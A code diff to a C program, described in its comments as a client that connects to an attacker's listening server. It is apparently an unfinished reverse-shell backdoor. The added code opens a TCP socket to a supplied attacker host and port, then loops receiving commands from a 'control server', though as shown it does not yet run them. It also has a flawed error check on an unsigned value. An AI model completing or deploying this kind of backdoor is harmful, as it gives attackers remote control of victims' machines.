@@ -1,10 +1,15 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <getopt.h> // parse command line args
-
-//#include "reverse_tcp.h"
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <sys/types.h>
+#include <string.h>
+#include <arpa/inet.h>
 
 // CLIENT to connect to attacker's listening "SERVER"
+
+#define CMD_SIZE 1024
 
 #define USAGE                                                                                      \
     "usage:\n"                                                                                     \
@@ -65,10 +70,41 @@ int main(int argc, char **argv) {
 
     /* SOCKET CODE ======================================================= */
     // create socket
+    int fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (fd < 0) {
+        fprintf(stderr, "STREAM SOCKET FAILURE\n");
+        exit(1);
+    }
 
+    // structure the server address
+    struct sockaddr_in server_addr; // use of the sockaddr_in struct for connect()
+    memset(&server_addr, 0, sizeof(server_addr)); // if part of the struct is undefined, default with 0 (we only use 3/5)
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(lport); // host to network short; just in case it's needed
+    int rtn = inet_pton(AF_INET, lhost, &server_addr.sin_addr.s_addr); // convert hostname to its binary representation
+    if (rtn < 0) {
+        fprintf(stderr, "ADDRESS FAILURE\n");
+        exit(1);
+    }
 
     // connect to the listening server
+    int conn = connect(fd, (struct sockaddr *) &server_addr, sizeof(server_addr));
+    if (conn < 0) {
+        fprintf(stderr, "CONNECTION FAILURE\n");
+        exit(1);
+    }
 
+    // receive commands from control server
+    char shell[CMD_SIZE];
+    size_t bytes_recv = 0;
+    while (1) {
+        bytes_recv = recv(fd, shell, CMD_SIZE, 0);
+        if (bytes_recv < 0) {
+            fprintf(stderr, "RECEIVING FAILURE\n");
+            exit(1);
+        }
+    }
+    
 
 
 
